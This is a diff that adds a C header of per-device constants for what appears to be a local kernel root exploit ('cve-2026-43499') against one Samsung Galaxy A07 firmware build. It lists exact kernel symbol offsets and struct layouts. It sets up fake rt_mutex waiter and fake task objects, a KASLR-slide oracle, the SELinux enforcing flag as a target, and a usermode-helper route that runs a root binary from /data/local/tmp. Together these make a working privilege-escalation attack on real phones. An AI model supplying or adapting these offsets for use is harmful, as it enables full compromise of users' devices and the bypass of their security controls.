@@ -1,0 +1,323 @@
+#ifndef OFFSET_H
+#define OFFSET_H
+
+/*
+ * a07-A075FXXS5BZD2 - Samsung Galaxy A07 (SM-A075F), firmware
+ * A075FXXS5BZD2, kernel 6.12.23-android16-5-abA075FXXS5BZD2-4k
+ * (aarch64, 4K pages, CONFIG_ARM64_VA_BITS_39).
+ *
+ * Every value in this file is verified against the exact A075FXXS5BZD2
+ * boot kernel Image by tools/derive_a075f_target.py (run in CI by
+ * .github/workflows/port-a075f.yml): symbol offsets come from the
+ * recovered vmlinux symbol table, structure layouts from the target's
+ * embedded BTF, the worker caller from the worker_thread disassembly,
+ * the trace event id from the ftrace event table plus the target
+ * trace.h, and the file_operations layout additionally from the on-image
+ * Rust ashmem fops table.  No offset was copied from another device.
+ *
+ * Derivation record: docs/A07-A075FXXS5BZD2.md.
+ */
+
+#if defined(APP_PAYLOAD) && APP_PAYLOAD
+#define BUILD_VARIANT_LABEL "a07-A075FXXS5BZD2-app-p0-baseline"
+#define APP_PHYS_P0_ORACLE 1
+#define APP_PHYS_VIRTUAL_BASE_ORACLE 1
+#define KIMAGE_VIRTUAL_BASE_MIN 0xffffffc040000000ULL
+#define KIMAGE_VIRTUAL_BASE_MAX 0xffffffc0c0000000ULL
+#else
+#define BUILD_VARIANT_LABEL "a07-A075FXXS5BZD2-root-umh"
+#endif
+
+#ifndef BUILD_FINGERPRINT
+#define BUILD_FINGERPRINT \
+  "samsung/a075fxx/a075f:16/BP4A.260406.019/A075FXXS5BZD2:user/release-keys"
+#endif
+
+#define KIMAGE_TEXT_BASE 0xffffffc080000000ULL
+/*
+ * P0_PHYS_OFFSET = 0x40000000 is CONFIRMED from on-device /proc/zoneinfo
+ * (DMA32 start_pfn 262144, Normal start_pfn 1048576; RAM 0x40000000-
+ * 0x140000000).  P0_KERNEL_PHYS_LOAD below is NOT confirmed: LK contains the
+ * literal 0x48400000 (always as the LK VA 0xffff48400000, i.e.
+ * KERNEL_ASPACE_BASE + 0x48400000) but also the string
+ * "kernel_addr (0x%p) is not taken from mb (0x%llx)", so LK normally takes
+ * kernel_addr from an MTK mblock reserve and 0x48400000 is only a static
+ * default.  Only the optional APP_PHYS_* diagnostic routes use it.
+ * See docs/A07-A075FXXS5BZD2.md section 4.1 for the on-device proof.
+ */
+#define P0_PAGE_OFFSET 0xffffff8000000000ULL
+#define P0_PHYS_OFFSET 0x40000000ULL
+#define P0_KERNEL_PHYS_LOAD 0x48400000ULL
+#define SKB_DATA_DELTA (-0xe80LL)
+#define KMALLOC_CACHE_TYPES 3
+#define KMALLOC_CGROUP_TYPE 2
+
+#define SLIDE_FAKE_WAITER_PRIO 0
+#define SLIDE_WAITER_WAKE_STATE 0
+#define SLIDE_LOCK_OWNER_VALUE 1ULL
+#define SLIDE_USE_FAKE_TASK 1
+/*
+ * tracefs event id for sched/sched_blocked_reason on this kernel.
+ *
+ * 6.12 dropped the old `next_event_type` counter from
+ * kernel/trace/trace_events.c: event ids are now handed out by an IDA in
+ * kernel/trace/trace_output.c
+ *
+ *     static int alloc_trace_event_type(void)
+ *     {
+ *             next = ida_alloc_range(&trace_event_ida, __TRACE_LAST_TYPE,
+ *                                    TRACE_EVENT_TYPE_MAX);
+ *
+ * i.e. every dynamically registered event gets id = __TRACE_LAST_TYPE + N,
+ * where N is the event's zero-based index in the __trace_events[] /
+ * __start_ftrace_events..__stop_ftrace_events table.
+ *
+ * __TRACE_LAST_TYPE = 20, not 19: enum trace_type in kernel/trace/trace.h
+ * spends the explicit value 0 on __TRACE_FIRST_TYPE, so the 19 named
+ * enumerators that follow (TRACE_FN..TRACE_FUNC_REPEATS) occupy 1..19 and
+ * __TRACE_LAST_TYPE lands on 20.
+ *
+ * Calibration on this Image (image offsets, vaddr = off + KIMAGE_TEXT_BASE):
+ *   __start_ftrace_events        0x246c5a8
+ *   __event_sched_waking         0x246c7f8  -> index 74
+ *   __event_sched_blocked_reason 0x246c878  -> index 90
+ * Device reports sched_waking/id = 94 and sched_blocked_reason/id = 110.
+ * Both indices give base 20 (94 - 74 == 110 - 90 == 16), so the indices are
+ * right and only the base was wrong.  Do not "re-derive" this by counting
+ * enum trace_type members.
+ */
+#define SLIDE_TRACEFS_EVENT_ID 110
+#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x00101ef8ULL
+/*
+ * SLIDE_PSELECT_WORD_SHIFT = 2 on this 6.12 kernel.
+ *
+ * The two independent, device-verified ports of the same GKI base
+ * (6.12.x-android16-5) both use 2:
+ *   ghostlock-a17  SM-A175F 6.12.23-android16-5-abA175FXXS3BZA5-4k  (2)
+ *   ghostlock-emerald Poco M6 Pro 6.12.30-android16-5-g6e872b4863d6 (2)
+ * while the 5.10/6.1/6.6 targets in this repository use 0.  The value was
+ * re-checked against the do_pselect disassembly of the exact A075F kernel
+ * (fs/select.c is unmodified GKI code between these builds).
+ */
+#define SLIDE_PSELECT_WORD_SHIFT 2
+#define SLIDE_P0_OFFSET_CANDIDATES \
+  0x000000ULL, 0x010000ULL, 0x020000ULL, 0x030000ULL, \
+  0x040000ULL, 0x050000ULL, 0x060000ULL, 0x070000ULL, \
+  0x080000ULL, 0x090000ULL, 0x0a0000ULL, 0x0b0000ULL, \
+  0x0c0000ULL, 0x0d0000ULL, 0x0e0000ULL, 0x0f0000ULL, \
+  0x100000ULL, 0x110000ULL, 0x120000ULL, 0x130000ULL, \
+  0x140000ULL, 0x150000ULL, 0x160000ULL, 0x170000ULL, \
+  0x180000ULL, 0x190000ULL, 0x1a0000ULL, 0x1b0000ULL, \
+  0x1c0000ULL, 0x1d0000ULL, 0x1e0000ULL, 0x1f0000ULL
+#define SLIDE_MAX_ATTEMPTS 32
+
+#if defined(APP_PAYLOAD) && APP_PAYLOAD
+#define ROUTE_WAIT_SECONDS 8
+#define PSELECT_ENTER_DELAY_USEC 50000
+#define SLIDE_PSELECT_TIMEOUT_NSEC 100000000L
+#define SLIDE_KSNITCH_APPENDED_FUTEXES 2048
+#define SLIDE_KSNITCH_REPEAT_MEASUREMENT 64
+#define SLIDE_KSNITCH_AVERAGE 8
+#define SLIDE_PHYSICAL_SLOT_DELAYS_USEC 20000
+#define SLIDE_VIRTUAL_BASE_DELAY_USEC 25000
+#define APP_PAYLOAD_ATTEMPT_DELAYS_USEC 25000, 20000, 30000, 50000
+#define APP_FOPS_ROUTE_USE_PSELECT_DELAY 1
+#define SLIDE_BANK_SLOTS 4
+#define SLIDE_BANK_TASK_OFF 0x1000
+#define SLIDE_BANK_TASK_STRIDE 0x1c0
+#define SLIDE_BANK_LOCK_OFF 0x5200
+#define SLIDE_BANK_SLOT_STRIDE 0x100
+#define SLIDE_BANK_WAITER_OFF 0x40
+#define P0_ORACLE_GATE_SLOT 0
+#define P0_ORACLE_PROBE_SLOT 1
+#define P0_ORACLE_GATE_RESTORE_SLOT 2
+#define P0_ORACLE_PROBE_RESTORE_SLOT 3
+#define P0_ORACLE_GATE_PAGE_OFF 0x0e80
+#define P0_ORACLE_GATE_OBJECT_INDEX 1
+#define P0_ORACLE_PROBE_OFFSET 0x1f0000ULL
+#define P0_FINGERPRINT_HEADER \
+  "targets/a07-A075FXXS5BZD2/p0_fingerprint.h"
+#endif
+
+#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
+#define KERNELSNITCH_IDENTITY_END 0xffffff9000000000ULL
+#define DIRECT_MAP_BASE 0xffffff8000000000ULL
+#define DIRECT_MAP_END 0xffffff9000000000ULL
+#define VMEMMAP_START 0xfffffffe00000000ULL
+
+/* Exact A075FXXS5BZD2 offsets from KIMAGE_TEXT_BASE. */
+#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x000f758cULL
+#define NOOP_LLSEEK_OFF 0x0043a610ULL
+#define COPY_SPLICE_READ_OFF 0x0048d0acULL
+#define CONFIGFS_READ_ITER_OFF 0x00510c04ULL
+#define CONFIGFS_BIN_WRITE_ITER_OFF 0x005111b0ULL
+#define ASHMEM_IOCTL_OFF 0x00dbf9d8ULL
+#define ASHMEM_COMPAT_IOCTL_OFF 0x00dbffc0ULL
+#define ASHMEM_MMAP_OFF 0x00dc003cULL
+#define ASHMEM_OPEN_OFF 0x00dc0098ULL
+#define ASHMEM_RELEASE_OFF 0x00dbfa98ULL
+#define ASHMEM_SHOW_FDINFO_OFF 0x00dbff98ULL
+#define ANON_PIPE_BUF_OPS_OFF 0x0124ee88ULL
+#define SLIDE_NFULNL_LOGGER_NAME_OFF 0x017e8698ULL
+#define KMALLOC_CACHES_OFF 0x0186b4c0ULL
+#define SYSTEM_UNBOUND_WQ_OFF 0x0186b250ULL
+#define ASHMEM_FOPS_OFF 0x024d2110ULL
+#define SLIDE_NFULNL_LOGGER_OBJECT_OFF 0x024c2198ULL
+#define ASHMEM_MISC_OFF 0x024d2370ULL
+#define INIT_TASK_OFF 0x024ccf00ULL
+#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF 0x025eafd8ULL
+#define ROOT_TASK_GROUP_OFF 0x026fdd80ULL
+#define SELINUX_ENFORCING_OFF 0x0274a820ULL
+#define SYSCTL_BOOTID_OFF 0x027ec630ULL
+
+#define ASHMEM_MISC_FOPS_OFF (ASHMEM_MISC_OFF + 0x10ULL)
+#define ASHMEM_MISC_FOPS (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
+#define ASHMEM_FOPS (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
+#define ASHMEM_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
+#define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
+#define ASHMEM_MMAP (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
+#define ASHMEM_OPEN (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
+#define ASHMEM_RELEASE (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
+#define ASHMEM_SHOW_FDINFO (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
+#define CONFIGFS_READ_ITER (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
+#define CONFIGFS_BIN_WRITE_ITER \
+  (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
+#define COPY_SPLICE_READ (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
+#define NOOP_LLSEEK (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
+#define INIT_TASK (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
+#define ROOT_TASK_GROUP (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
+#define SELINUX_ENFORCING (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
+#define KMALLOC_CACHES (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
+
+#define SLIDE_NFULNL_LOGGER_NAME_IMAGE \
+  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_NAME_OFF)
+#define SLIDE_NFULNL_LOGGER_OBJECT_IMAGE \
+  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OBJECT_OFF)
+#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_IMAGE \
+  (KIMAGE_TEXT_BASE + SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF)
+#define ANON_PIPE_BUF_OPS (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
+#define CALL_USERMODEHELPER_EXEC_WORK \
+  (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_OFF)
+#define SYSTEM_UNBOUND_WQ (KIMAGE_TEXT_BASE + SYSTEM_UNBOUND_WQ_OFF)
+#define SLIDE_RB_PARENT_TYPE_RESTORE 1ULL
+
+#define SLIDE_INIT_TASK_OFF INIT_TASK_OFF
+#define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF
+#define SLIDE_SYSCTL_BOOTID_OFF SYSCTL_BOOTID_OFF
+#define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
+#define SLIDE_ROOT_TASK_GROUP_IMAGE \
+  (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
+#define SLIDE_SYSCTL_BOOTID_IMAGE \
+  (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)
+
+#define LOCK_OFF 0x2210
+#define W0_OFF 0x2350
+#define FOPS_OFF 0x2000
+#define SCRATCH_OFF 0x3000
+#define RIGHT_OFF 0x4440
+#define LEFT_OFF 0x5550
+#define FAKE_TASK_OFF 0x3200
+
+#define ROOT_UMH_WORK_OFF 0x6000
+#define ROOT_UMH_DATA_OFF 0x6200
+#define ROOT_UMH_PATH "/data/local/tmp/cve-2026-43499-root"
+
+/*
+ * file_operations on this 6.12 kernel (target BTF, independently confirmed
+ * by resolving the on-image Rust ashmem fops table to the
+ * kernel::miscdevice::fops_*::<ashmem_rust::Ashmem> symbols):
+ * owner 0x00, fop_flags 0x08, llseek 0x10, read 0x18, write 0x20,
+ * read_iter 0x28, write_iter 0x30, iopoll 0x38, iterate_shared 0x40,
+ * poll 0x48, unlocked_ioctl 0x50, compat_ioctl 0x58, mmap 0x60,
+ * open 0x68, flush 0x70, release 0x78, ..., splice_read 0xb8,
+ * show_fdinfo 0xd8, ..., sizeof 0x108.
+ *
+ * Do NOT reuse the 6.6 layout (llseek 0x08, read 0x10, ..., ioctl 0x48,
+ * mmap 0x58): that is the a36xq/A366W 6.6 layout and it is wrong here.
+ */
+#define SIZEOF_FILE_OPERATIONS 0x108
+#define FOPS_OWNER_OFF 0x00
+#define FOPS_LLSEEK_OFF 0x10
+#define FOPS_READ_OFF 0x18
+#define FOPS_WRITE_OFF 0x20
+#define FOPS_READ_ITER_OFF 0x28
+#define FOPS_WRITE_ITER_OFF 0x30
+#define FOPS_UNLOCKED_IOCTL_OFF 0x50
+#define FOPS_COMPAT_IOCTL_OFF 0x58
+#define FOPS_MMAP_OFF 0x60
+#define FOPS_OPEN_OFF 0x68
+#define FOPS_RELEASE_OFF 0x78
+#define FOPS_SPLICE_READ_OFF 0xb8
+#define FOPS_SHOW_FDINFO_OFF 0xd8
+#define FOPS_IOCTL_OFF FOPS_UNLOCKED_IOCTL_OFF
+
+/* task_struct on this 6.12 kernel (target BTF; cross-checked against the
+ * device-verified ghostlock-a17 6.12.23-android16-5 table). */
+#define TASK_USAGE_OFF 0x40
+#define TASK_PRIO_OFF 0x94
+#define TASK_NORMAL_PRIO_OFF 0x9c
+#define TASK_SCHED_TASK_GROUP_OFF 0x420
+#define TASK_PI_LOCK_OFF 0x9ec
+#define TASK_PI_WAITERS_OFF 0xa00
+#define TASK_PI_TOP_TASK_OFF 0xa10
+#define TASK_PI_BLOCKED_ON_OFF 0xa18
+
+/* struct page (6.12: page->slab_cache is gone; slab metadata lives in
+ * struct slab embedded at the page start, slab_cache at +0x08). */
+#define SIZEOF_PAGE 0x40
+#define PAGE_COMPOUND_HEAD_OFF 0x08
+#define PAGE_SLAB_CACHE_OFF 0x08
+#define PAGE_PAGE_TYPE_OFF 0x30
+#define STRUCT_PAGE_SIZE SIZEOF_PAGE
+#define STRUCT_PAGE_COMPOUND_HEAD_OFF PAGE_COMPOUND_HEAD_OFF
+#define STRUCT_SLAB_CACHE_OFF PAGE_SLAB_CACHE_OFF
+#define STRUCT_PAGE_TYPE_OFF PAGE_PAGE_TYPE_OFF
+
+/* compact rt_mutex_waiter (6.12). */
+#define FAKE_WAITER_TREE_PRIO_OFF 0x18
+#define FAKE_WAITER_TREE_DEADLINE_OFF 0x20
+#define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x28
+#define FAKE_WAITER_PI_TREE_PRIO_OFF 0x40
+#define FAKE_WAITER_PI_TREE_DEADLINE_OFF 0x48
+#define FAKE_WAITER_TASK_OFF 0x50
+#define FAKE_WAITER_LOCK_OFF 0x58
+#define FAKE_WAITER_WAKE_STATE_OFF 0x60
+#define FAKE_WAITER_WW_CTX_OFF 0x68
+
+#define WORK_DATA_OFF 0x00
+#define WORK_ENTRY_OFF 0x08
+#define WORK_FUNC_OFF 0x18
+
+#define PWQ_POOL_OFF 0x00
+#define PWQ_WQ_OFF 0x08
+#define PWQ_WORK_COLOR_OFF 0x10
+#define PWQ_REFCNT_OFF 0x18
+#define PWQ_NR_IN_FLIGHT_OFF 0x1c
+#define PWQ_NR_ACTIVE_OFF 0x60
+#define PWQ_MAX_ACTIVE_OFF 0x60
+
+#define POOL_WORKLIST_OFF 0x28
+#define POOL_NR_IDLE_OFF 0x3c
+
+#define WQ_DFL_PWQ_OFF 0xc0
+
+/* struct configfs_buffer (6.12 name for the old configfs_bin_buffer). */
+#define CFG_PAGE_OFF 16
+#define CFG_NEEDS_READ_FILL_OFF 80
+#define CFG_BIN_BUFFER_OFF 88
+#define CFG_BIN_BUFFER_SIZE_OFF 96
+#define CFG_CB_MAX_SIZE_OFF 100
+
+#define FAKE_TASK_USAGE_OFF TASK_USAGE_OFF
+#define FAKE_TASK_PRIO_OFF TASK_PRIO_OFF
+#define FAKE_TASK_NORMAL_PRIO_OFF TASK_NORMAL_PRIO_OFF
+#define FAKE_TASK_PI_LOCK_OFF TASK_PI_LOCK_OFF
+#define FAKE_TASK_PI_WAITERS_OFF TASK_PI_WAITERS_OFF
+#define FAKE_TASK_TASK_GROUP_OFF TASK_SCHED_TASK_GROUP_OFF
+#define FAKE_TASK_PI_TOP_TASK_OFF TASK_PI_TOP_TASK_OFF
+#define FAKE_TASK_PI_BLOCKED_ON_OFF TASK_PI_BLOCKED_ON_OFF
+
+#define PIPE_BUFFER_SLOTS 32
+#define PIPE_BUF_FLAG_CAN_MERGE 0x10
+
+#endif
